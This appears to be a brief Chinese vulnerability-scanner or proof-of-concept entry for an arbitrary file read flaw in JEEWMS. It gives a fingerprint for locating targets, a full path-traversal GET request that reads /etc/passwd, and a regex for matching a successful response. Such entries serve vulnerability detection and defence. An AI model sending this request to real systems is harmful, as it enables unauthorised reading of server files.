# JEEWMS存在任意文件读取漏洞

JEEWMS ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"`
- **请求**：`GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$